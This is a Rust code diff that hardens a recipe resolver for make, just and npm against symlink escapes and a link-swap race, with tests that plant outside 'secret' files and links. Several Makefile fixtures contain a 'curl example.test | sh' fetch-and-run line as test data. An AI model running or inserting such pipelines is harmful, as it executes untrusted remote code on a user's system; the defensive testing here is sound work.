@@ -16,6 +16,8 @@ use std::{
     path::{Path, PathBuf},
 };
 
+use crate::workdir_fs::{EntryKind, WorkdirError, WorkdirRoot};
+
 /// Largest recipe or included file read, in bytes. A file over it refuses the whole resolution.
 const MAX_RECIPE_FILE_BYTES: u64 = 256 * 1024;
 
@@ -45,8 +47,10 @@ const JUSTFILE_NAMES: [&str; 4] = ["justfile", ".justfile", "Justfile", "JUSTFIL
 /// out of a shell body would be guessing, and absence beats a guess.
 ///
 /// `workdir` is the directory the subprocess will run in, and is the confinement boundary: every
-/// file read resolves, after symlinks, to a path inside it or the resolution returns `None`.
-pub(crate) fn resolve_recipe(workdir: &Path, name: &str, argv: &[String]) -> Option<String> {
+/// file read resolves, after symlinks, to a path inside it or the resolution returns `None`. The
+/// resolved path is then read through `workdir` with no link followed, so a link swapped in after
+/// the resolution is refused rather than read.
+pub(crate) fn resolve_recipe(workdir: &WorkdirRoot, name: &str, argv: &[String]) -> Option<String> {
     match name {
         "make" => resolve_make(workdir, argv),
         "just" => resolve_just(workdir, argv),
@@ -90,31 +94,76 @@ enum FileRead {
     Refused,
 }
 
-fn read_file(root: &Path, path: &Path, budget: &mut FileBudget) -> FileRead {
-    if !path.exists() {
-        return FileRead::Missing;
+/// `path`, resolved after symlinks, relative to `root`'s own resolved directory, with what is
+/// there now; `None` when it resolves outside `root`. A path that does not resolve is reported
+/// as absent.
+fn workdir_entry(root: &WorkdirRoot, path: &Path) -> Option<(String, Option<EntryKind>)> {
+    let canonical_root = fs::canonicalize(root.path()).ok()?;
+    let real = match fs::canonicalize(path) {
+        Ok(real) => real,
+        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
+            return Some((String::new(), None))
+        }
+        Err(_) => return None,
+    };
+    let rel = real.strip_prefix(&canonical_root).ok()?;
+    let rel = rel.to_string_lossy().into_owned();
+    if rel.is_empty() {
+        return Some((rel, Some(EntryKind::Directory)));
     }
-    let Some(real) = confine(root, path) else {
+    let kind = root.entry_kind(&rel).ok()?;
+    Some((rel, kind))
+}
+
+/// Whether `path` resolves to a regular file inside `root`.
+fn is_workdir_file(root: &WorkdirRoot, path: &Path) -> bool {
+    matches!(workdir_entry(root, path), Some((_, Some(EntryKind::File))))
+}
+
+#[cfg(test)]
+thread_local! {
+    /// Runs between a recipe file's resolution and its read, so a test can swap a link in the
+    /// window a racing capsule would use.
+    static AFTER_RESOLVE: std::cell::RefCell<Option<Box<dyn FnOnce()>>> =
+        const { std::cell::RefCell::new(None) };
+}
+
+/// Reads the regular file `path` resolves to inside `root`, through `root` with no link
+/// followed: what canonicalization found is what is read, or nothing is. A link swapped in
+/// between the two is refused, which the session's latch records.
+fn read_file(root: &WorkdirRoot, path: &Path, budget: &mut FileBudget) -> FileRead {
+    let Some((rel, kind)) = workdir_entry(root, path) else {
         return FileRead::Refused;
     };
-    let Ok(meta) = fs::metadata(&real) else {
-        return FileRead::Refused;
-    };
-    if !meta.is_file() || meta.len() > MAX_RECIPE_FILE_BYTES || budget.take().is_none() {
+    match kind {
+        None => return FileRead::Missing,
+        Some(EntryKind::File) => {}
+        Some(_) => return FileRead::Refused,
+    }
+    if budget.take().is_none() {
         return FileRead::Refused;
     }
-    match fs::read(&real).map(String::from_utf8) {
-        Ok(Ok(text)) => FileRead::Text(text),
-        Ok(Err(_)) | Err(_) => FileRead::Refused,
+    #[cfg(test)]
+    if let Some(hook) = AFTER_RESOLVE.with(|slot| slot.borrow_mut().take()) {
+        hook();
+    }
+    match root.read_file(&rel, MAX_RECIPE_FILE_BYTES) {
+        Ok(Some(bytes)) => match String::from_utf8(bytes) {
+            Ok(text) => FileRead::Text(text),
+            Err(_) => FileRead::Refused,
+        },
+        Ok(None) => FileRead::Missing,
+        Err(WorkdirError::Refused(_) | WorkdirError::Io { .. }) => FileRead::Refused,
     }
 }
 
 /// The one directory a recipe file is looked for in: `workdir`, or the confined subdirectory the
 /// invocation selected.
-fn search_dir(workdir: &Path, selected: Option<&String>) -> Option<PathBuf> {
+fn search_dir(workdir: &WorkdirRoot, selected: Option<&String>) -> Option<PathBuf> {
+    let root = workdir.path();
     match selected {
-        Some(dir) => confine(workdir, &workdir.join(dir)),
-        None => confine(workdir, workdir),
+        Some(dir) => confine(root, &root.join(dir)),
+        None => confine(root, root),
     }
 }
 
@@ -174,7 +223,7 @@ fn parse_make_argv(argv: &[String]) -> Option<MakeInvocation> {
 /// rules are not matched against, `ifeq` and every other conditional is read as ordinary text,
 /// `.PHONY` and the other special targets are treated as the plain target names they are, and
 /// `$(MAKE)` recursion is not followed. A target reachable only through a pattern rule is `None`.
-fn resolve_make(workdir: &Path, argv: &[String]) -> Option<String> {
+fn resolve_make(workdir: &WorkdirRoot, argv: &[String]) -> Option<String> {
     let invocation = parse_make_argv(argv)?;
     let dir = search_dir(workdir, invocation.directory.as_ref())?;
     let path = match invocation.makefile {
@@ -182,7 +231,7 @@ fn resolve_make(workdir: &Path, argv: &[String]) -> Option<String> {
         None => MAKEFILE_NAMES
             .iter()
             .map(|name| dir.join(name))
-            .find(|candidate| candidate.is_file())?,
+            .find(|candidate| is_workdir_file(workdir, candidate))?,
     };
 
     let mut budget = FileBudget::new();
@@ -194,7 +243,7 @@ fn resolve_make(workdir: &Path, argv: &[String]) -> Option<String> {
 /// Append `path`'s lines to `out`, splicing every `include`d file in at the point its directive
 /// appears, so the assembled stream is the one make itself would read.
 fn read_makefile(
-    workdir: &Path,
+    workdir: &WorkdirRoot,
     path: &Path,
     depth: usize,
     budget: &mut FileBudget,
@@ -219,7 +268,7 @@ fn read_makefile(
                 return None;
             }
             let included = dir.join(name);
-            if !included.exists() {
+            if matches!(workdir_entry(workdir, &included), Some((_, None))) {
                 if optional {
                     continue;
                 }
@@ -358,7 +407,7 @@ fn parse_just_argv(argv: &[String]) -> Option<JustInvocation> {
 /// Nothing is expanded: `{{ … }}` interpolations, `$VAR`, recipe parameters and their defaults,
 /// `set` settings and `mod` submodules are carried as written or ignored. `alias b := build` is
 /// not followed, so an aliased name resolves to `None` like any other undefined recipe.
-fn resolve_just(workdir: &Path, argv: &[String]) -> Option<String> {
+fn resolve_just(workdir: &WorkdirRoot, argv: &[String]) -> Option<String> {
     let invocation = parse_just_argv(argv)?;
     let dir = search_dir(workdir, invocation.directory.as_ref())?;
     let path = match invocation.justfile {
@@ -366,7 +415,7 @@ fn resolve_just(workdir: &Path, argv: &[String]) -> Option<String> {
         None => JUSTFILE_NAMES
             .iter()
             .map(|name| dir.join(name))
-            .find(|candidate| candidate.is_file())?,
+            .find(|candidate| is_workdir_file(workdir, candidate))?,
     };
 
     let mut budget = FileBudget::new();
@@ -378,7 +427,7 @@ fn resolve_just(workdir: &Path, argv: &[String]) -> Option<String> {
 /// Append `path`'s lines to `out`, splicing every `import`ed file in at the point its directive
 /// appears.
 fn read_justfile(
-    workdir: &Path,
+    workdir: &WorkdirRoot,
     path: &Path,
     depth: usize,
     budget: &mut FileBudget,
@@ -397,7 +446,7 @@ fn read_justfile(
             return None;
         }
         let imported = dir.join(name);
-        if !imported.exists() {
+        if matches!(workdir_entry(workdir, &imported), Some((_, None))) {
             if optional {
                 continue;
             }
@@ -526,7 +575,7 @@ fn dedent(lines: &[&str]) -> String {
 ///
 /// Nothing is expanded: `npm_*` environment variables, `$npm_…` references, `config`
 /// substitutions and workspace fan-out are carried as written or not modelled at all.
-fn resolve_npm(workdir: &Path, argv: &[String]) -> Option<String> {
+fn resolve_npm(workdir: &WorkdirRoot, argv: &[String]) -> Option<String> {
     let [subcommand, script] = argv else {
         return None;
     };
@@ -538,8 +587,8 @@ fn resolve_npm(workdir: &Path, argv: &[String]) -> Option<String> {
     }
 
     let mut budget = FileBudget::new();
-    let FileRead::Text(text) = read_file(workdir, &workdir.join("package.json"), &mut budget)
-    else {
+    let package_json = workdir.host_path("package.json");
+    let FileRead::Text(text) = read_file(workdir, &package_json, &mut budget) else {
         return None;
     };
     let package: serde_json::Value = serde_json::from_str(&text).ok()?;
@@ -557,6 +606,11 @@ mod tests {
     use super::*;
     use std::fs;
     use tempfile::TempDir;
+
+    /// [`resolve_recipe`] with `workdir` opened as the accessible root.
+    fn resolve_recipe_at(workdir: impl AsRef<Path>, name: &str, argv: &[String]) -> Option<String> {
+        resolve_recipe(&WorkdirRoot::open(workdir.as_ref()).unwrap(), name, argv)
+    }
 
     fn argv(words: &[&str]) -> Vec<String> {
         words.iter().map(|w| w.to_string()).collect()
@@ -582,7 +636,7 @@ mod tests {
         );
 
         assert_eq!(
-            resolve_recipe(tmp.path(), "just", &argv(&["build"])),
+            resolve_recipe_at(tmp.path(), "just", &argv(&["build"])),
             Some("echo one\necho two".to_string())
         );
     }
@@ -594,7 +648,7 @@ mod tests {
             let tmp = TempDir::new().unwrap();
             write(tmp.path(), name, "build:\n  echo from-file\n");
             assert_eq!(
-                resolve_recipe(tmp.path(), "just", &argv(&["build"])),
+                resolve_recipe_at(tmp.path(), "just", &argv(&["build"])),
                 Some("echo from-file".to_string()),
                 "{name} is one of the names just looks for"
             );
@@ -612,7 +666,7 @@ mod tests {
         );
 
         assert_eq!(
-            resolve_recipe(tmp.path(), "just", &argv(&["deploy"])),
+            resolve_recipe_at(tmp.path(), "just", &argv(&["deploy"])),
             Some("ship {{target}} $HOME".to_string())
         );
     }
@@ -625,7 +679,7 @@ mod tests {
         write(tmp.path(), "shared.just", "build:\n  echo shared\n");
         write(tmp.path(), "justfile", "import 'shared.just'\n");
         assert_eq!(
-            resolve_recipe(tmp.path(), "just", &argv(&["build"])),
+            resolve_recipe_at(tmp.path(), "just", &argv(&["build"])),
             Some("echo shared".to_string())
         );
 
@@ -635,7 +689,7 @@ mod tests {
             "import? 'absent.just'\nbuild:\n  echo local\n",
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "just", &argv(&["build"])),
+            resolve_recipe_at(tmp.path(), "just", &argv(&["build"])),
             Some("echo local".to_string())
         );
 
@@ -644,7 +698,10 @@ mod tests {
             "justfile",
             "import 'absent.just'\nbuild:\n  echo local\n",
         );
-        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["build"])), None);
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "just", &argv(&["build"])),
+            None
+        );
     }
 
     /// An alias is a name the runtime does not follow to the recipe behind it.
@@ -657,9 +714,9 @@ mod tests {
             "alias b := build\n\nbuild:\n  echo one\n",
         );
 
-        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["b"])), None);
+        assert_eq!(resolve_recipe_at(tmp.path(), "just", &argv(&["b"])), None);
         assert_eq!(
-            resolve_recipe(tmp.path(), "just", &argv(&["build"])),
+            resolve_recipe_at(tmp.path(), "just", &argv(&["build"])),
             Some("echo one".to_string())
         );
     }
@@ -671,20 +728,23 @@ mod tests {
         let tmp = TempDir::new().unwrap();
         write(tmp.path(), "justfile", "build:\n  echo one\n");
 
-        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["absent"])), None);
         assert_eq!(
-            resolve_recipe(tmp.path(), "just", &argv(&["mod::build"])),
+            resolve_recipe_at(tmp.path(), "just", &argv(&["absent"])),
             None
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "just", &argv(&["build", "extra"])),
+            resolve_recipe_at(tmp.path(), "just", &argv(&["mod::build"])),
             None
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "just", &argv(&["--dry-run", "build"])),
+            resolve_recipe_at(tmp.path(), "just", &argv(&["build", "extra"])),
             None
         );
-        assert_eq!(resolve_recipe(tmp.path(), "just", &[]), None);
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "just", &argv(&["--dry-run", "build"])),
+            None
+        );
+        assert_eq!(resolve_recipe_at(tmp.path(), "just", &[]), None);
     }
 
     /// `-f` and `-d` select the file and the directory, and both stay inside the workdir.
@@ -695,15 +755,15 @@ mod tests {
         write(tmp.path(), "other.just", "build:\n  echo named\n");
 
         assert_eq!(
-            resolve_recipe(tmp.path(), "just", &argv(&["-d", "sub", "build"])),
+            resolve_recipe_at(tmp.path(), "just", &argv(&["-d", "sub", "build"])),
             Some("echo nested".to_string())
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "just", &argv(&["-f", "other.just", "build"])),
+            resolve_recipe_at(tmp.path(), "just", &argv(&["-f", "other.just", "build"])),
             Some("echo named".to_string())
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "just", &argv(&["-d", "..", "build"])),
+            resolve_recipe_at(tmp.path(), "just", &argv(&["-d", "..", "build"])),
             None
         );
     }
@@ -714,7 +774,10 @@ mod tests {
         let tmp = TempDir::new().unwrap();
         fs::write(tmp.path().join("justfile"), [0x62, 0x75, 0xff, 0x3a, 0x0a]).unwrap();
 
-        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["build"])), None);
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "just", &argv(&["build"])),
+            None
+        );
     }
 
     /// A body over [`MAX_RECIPE_BODY_BYTES`] is absent rather than clipped.
@@ -728,7 +791,10 @@ mod tests {
             &format!("build:\n{}", line.repeat(MAX_RECIPE_BODY_BYTES / 1000 + 2)),
         );
 
-        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["build"])), None);
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "just", &argv(&["build"])),
+            None
+        );
     }
 
     /// An import chain deeper than [`MAX_INCLUDE_DEPTH`] is absence rather than a partial read.
@@ -750,7 +816,10 @@ mod tests {
             "build:\n  echo deep\n",
         );
 
-        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["build"])), None);
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "just", &argv(&["build"])),
+            None
+        );
     }
 
     // ── make ─────────────────────────────────────────────────────────────────
@@ -766,7 +835,7 @@ mod tests {
         );
 
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["deploy"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["deploy"])),
             Some("echo $(REGISTRY)\necho two".to_string())
         );
     }
@@ -777,19 +846,19 @@ mod tests {
         let tmp = TempDir::new().unwrap();
         write(tmp.path(), "Makefile", "build:\n\techo last\n");
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["build"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["build"])),
             Some("echo last".to_string())
         );
 
         write(tmp.path(), "makefile", "build:\n\techo middle\n");
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["build"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["build"])),
             Some("echo middle".to_string())
         );
 
         write(tmp.path(), "GNUmakefile", "build:\n\techo first\n");
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["build"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["build"])),
             Some("echo first".to_string())
         );
     }
@@ -802,7 +871,7 @@ mod tests {
         write(tmp.path(), "rules.mk", "build:\n\techo included\n");
         write(tmp.path(), "Makefile", "include rules.mk\n");
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["build"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["build"])),
             Some("echo included".to_string())
         );
 
@@ -813,7 +882,7 @@ mod tests {
                 &format!("{directive} absent.mk\nbuild:\n\techo local\n"),
             );
             assert_eq!(
-                resolve_recipe(tmp.path(), "make", &argv(&["build"])),
+                resolve_recipe_at(tmp.path(), "make", &argv(&["build"])),
                 Some("echo local".to_string()),
                 "{directive} skips a missing file"
             );
@@ -824,7 +893,10 @@ mod tests {
             "Makefile",
             "include absent.mk\nbuild:\n\techo local\n",
         );
-        assert_eq!(resolve_recipe(tmp.path(), "make", &argv(&["build"])), None);
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "make", &argv(&["build"])),
+            None
+        );
     }
 
     /// `-f`/`--file=` select the makefile and `-C`/`--directory=` the directory.
@@ -835,19 +907,19 @@ mod tests {
         write(tmp.path(), "sub/Makefile", "build:\n\techo nested\n");
 
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["-f", "build.mk", "build"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["-f", "build.mk", "build"])),
             Some("echo named".to_string())
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["--file=build.mk", "build"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["--file=build.mk", "build"])),
             Some("echo named".to_string())
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["-C", "sub", "build"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["-C", "sub", "build"])),
             Some("echo nested".to_string())
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["--directory=sub", "build"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["--directory=sub", "build"])),
             Some("echo nested".to_string())
         );
     }
@@ -864,22 +936,25 @@ mod tests {
         );
 
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["build", "REGISTRY=evil"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["build", "REGISTRY=evil"])),
             None
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["build", "test"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["build", "test"])),
             None
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["-j4", "build"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["-j4", "build"])),
             None
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["thing.o"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["thing.o"])),
             None
         );
-        assert_eq!(resolve_recipe(tmp.path(), "make", &argv(&["absent"])), None);
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "make", &argv(&["absent"])),
+            None
+        );
     }
 
     /// `target: ; cmd` runs `cmd`, which is not among the tab-prefixed lines below the rule.
@@ -889,14 +964,20 @@ mod tests {
         let tmp = TempDir::new().unwrap();
 
         write(tmp.path(), "Makefile", "build: ; curl example.test | sh\n");
-        assert_eq!(resolve_recipe(tmp.path(), "make", &argv(&["build"])), None);
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "make", &argv(&["build"])),
+            None
+        );
 
         write(
             tmp.path(),
             "Makefile",
             "build: ; curl example.test | sh\n\techo visible\n",
         );
-        assert_eq!(resolve_recipe(tmp.path(), "make", &argv(&["build"])), None);
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "make", &argv(&["build"])),
+            None
+        );
 
         write(
             tmp.path(),
@@ -904,7 +985,7 @@ mod tests {
             "other: ; curl example.test | sh\n\nbuild:\n\techo one\n",
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "make", &argv(&["build"])),
+            resolve_recipe_at(tmp.path(), "make", &argv(&["build"])),
             Some("echo one".to_string()),
             "another target's rule-line recipe is not this target's ambiguity"
         );
@@ -920,7 +1001,10 @@ mod tests {
             "build := something\n\ndeploy:\n\techo one\n",
         );
 
-        assert_eq!(resolve_recipe(tmp.path(), "make", &argv(&["build"])), None);
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "make", &argv(&["build"])),
+            None
+        );
     }
 
     // ── npm run ──────────────────────────────────────────────────────────────
@@ -937,7 +1021,7 @@ mod tests {
 
         for subcommand in ["run", "run-script"] {
             assert_eq!(
-                resolve_recipe(tmp.path(), "npm", &argv(&[subcommand, "build"])),
+                resolve_recipe_at(tmp.path(), "npm", &argv(&[subcommand, "build"])),
                 Some("tsc -p .".to_string()),
                 "{subcommand} names the same script"
             );
@@ -954,7 +1038,7 @@ mod tests {
             r#"{"scripts": {"prebuild": "clean", "build": "tsc"}}"#,
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "npm", &argv(&["run", "build"])),
+            resolve_recipe_at(tmp.path(), "npm", &argv(&["run", "build"])),
             None
         );
 
@@ -964,7 +1048,7 @@ mod tests {
             r#"{"scripts": {"build": "tsc", "postbuild": "sign"}}"#,
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "npm", &argv(&["run", "build"])),
+            resolve_recipe_at(tmp.path(), "npm", &argv(&["run", "build"])),
             None
         );
     }
@@ -976,7 +1060,7 @@ mod tests {
         let tmp = TempDir::new().unwrap();
         write(tmp.path(), "package.json", "{not json");
         assert_eq!(
-            resolve_recipe(tmp.path(), "npm", &argv(&["run", "build"])),
+            resolve_recipe_at(tmp.path(), "npm", &argv(&["run", "build"])),
             None
         );
 
@@ -986,19 +1070,22 @@ mod tests {
             r#"{"scripts": {"build": "tsc"}}"#,
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "npm", &argv(&["run", "absent"])),
+            resolve_recipe_at(tmp.path(), "npm", &argv(&["run", "absent"])),
             None
         );
-        assert_eq!(resolve_recipe(tmp.path(), "npm", &argv(&["run"])), None);
+        assert_eq!(resolve_recipe_at(tmp.path(), "npm", &argv(&["run"])), None);
         assert_eq!(
-            resolve_recipe(tmp.path(), "npm", &argv(&["run", "build", "--", "-v"])),
+            resolve_recipe_at(tmp.path(), "npm", &argv(&["run", "build", "--", "-v"])),
             None
         );
         assert_eq!(
-            resolve_recipe(tmp.path(), "npm", &argv(&["run", "-w", "pkg", "build"])),
+            resolve_recipe_at(tmp.path(), "npm", &argv(&["run", "-w", "pkg", "build"])),
             None
         );
-        assert_eq!(resolve_recipe(tmp.path(), "npm", &argv(&["install"])), None);
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "npm", &argv(&["install"])),
+            None
+        );
     }
 
     // ── confinement and recognition ──────────────────────────────────────────
@@ -1017,12 +1104,12 @@ mod tests {
             "Makefile",
             "include ../secret.mk\nbuild:\n\techo local\n",
         );
-        assert_eq!(resolve_recipe(&workdir, "make", &argv(&["build"])), None);
+        assert_eq!(resolve_recipe_at(&workdir, "make", &argv(&["build"])), None);
 
         fs::write(outer.path().join("secret.just"), "build:\n  echo secret\n").unwrap();
         std::os::unix::fs::symlink(outer.path().join("secret.just"), workdir.join("justfile"))
             .unwrap();
-        assert_eq!(resolve_recipe(&workdir, "just", &argv(&["build"])), None);
+        assert_eq!(resolve_recipe_at(&workdir, "just", &argv(&["build"])), None);
     }
 
     /// Recognition keys on the invoked name alone. A tool with no parser, and a shell
@@ -1033,11 +1120,17 @@ mod tests {
         write(tmp.path(), "justfile", "build:\n  echo one\n");
 
         assert_eq!(
-            resolve_recipe(tmp.path(), "bash", &argv(&["-c", "just build"])),
+            resolve_recipe_at(tmp.path(), "bash", &argv(&["-c", "just build"])),
             None
         );
-        assert_eq!(resolve_recipe(tmp.path(), "cargo", &argv(&["build"])), None);
-        assert_eq!(resolve_recipe(tmp.path(), "gmake", &argv(&["build"])), None);
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "cargo", &argv(&["build"])),
+            None
+        );
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "gmake", &argv(&["build"])),
+            None
+        );
     }
 
     /// A workdir with no recipe file at all is absence, and no panic.
@@ -1045,10 +1138,77 @@ mod tests {
     fn an_empty_workdir_resolves_to_nothing() {
         let tmp = TempDir::new().unwrap();
 
-        assert_eq!(resolve_recipe(tmp.path(), "just", &argv(&["build"])), None);
-        assert_eq!(resolve_recipe(tmp.path(), "make", &argv(&["build"])), None);
         assert_eq!(
-            resolve_recipe(tmp.path(), "npm", &argv(&["run", "build"])),
+            resolve_recipe_at(tmp.path(), "just", &argv(&["build"])),
+            None
+        );
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "make", &argv(&["build"])),
+            None
+        );
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "npm", &argv(&["run", "build"])),
+            None
+        );
+    }
+
+    /// A justfile swapped for a link to an outside file after it was resolved and before it is
+    /// read resolves to nothing, and nothing outside is read; the swap is refused on the latch.
+    #[test]
+    fn recipes_a_link_swapped_in_after_resolution_reads_nothing_outside() {
+        let tmp = TempDir::new().unwrap();
+        let outside = TempDir::new().unwrap();
+        write(tmp.path(), "justfile", "build:\n    echo inside\n");
+        write(outside.path(), "justfile", "build:\n    echo SECRET\n");
+        let root = WorkdirRoot::open(tmp.path()).unwrap();
+        let justfile = tmp.path().join("justfile");
+        let target = outside.path().join("justfile");
+        AFTER_RESOLVE.with(|slot| {
+            *slot.borrow_mut() = Some(Box::new(move || {
+                fs::remove_file(&justfile).unwrap();
+                std::os::unix::fs::symlink(&target, &justfile).unwrap();
+            }))
+        });
+
+        let resolved = resolve_recipe(&root, "just", &argv(&["build"]));
+
+        assert_eq!(resolved, None);
+        assert_eq!(root.take_refusals().len(), 1);
+        assert_eq!(
+            fs::read_to_string(outside.path().join("justfile")).unwrap(),
+            "build:\n    echo SECRET\n"
+        );
+    }
+
+    /// A link to another file inside the workdir still resolves: canonicalization names the file
+    /// it reaches, and that file is read with no link on the way.
+    #[test]
+    fn recipes_a_link_to_another_workdir_file_still_resolves() {
+        let tmp = TempDir::new().unwrap();
+        write(tmp.path(), "recipes/main.just", "build:\n    echo linked\n");
+        std::os::unix::fs::symlink(
+            tmp.path().join("recipes/main.just"),
+            tmp.path().join("justfile"),
+        )
+        .unwrap();
+        let root = WorkdirRoot::open(tmp.path()).unwrap();
+        assert_eq!(
+            resolve_recipe(&root, "just", &argv(&["build"])),
+            Some("echo linked".to_string())
+        );
+        assert!(root.take_refusals().is_empty());
+    }
+
+    /// A link to a file outside the workdir is confined away before any read.
+    #[test]
+    fn recipes_a_link_out_of_the_workdir_resolves_to_nothing() {
+        let tmp = TempDir::new().unwrap();
+        let outside = TempDir::new().unwrap();
+        write(outside.path(), "justfile", "build:\n    echo SECRET\n");
+        std::os::unix::fs::symlink(outside.path().join("justfile"), tmp.path().join("justfile"))
+            .unwrap();
+        assert_eq!(
+            resolve_recipe_at(tmp.path(), "just", &argv(&["build"])),
             None
         );
     }
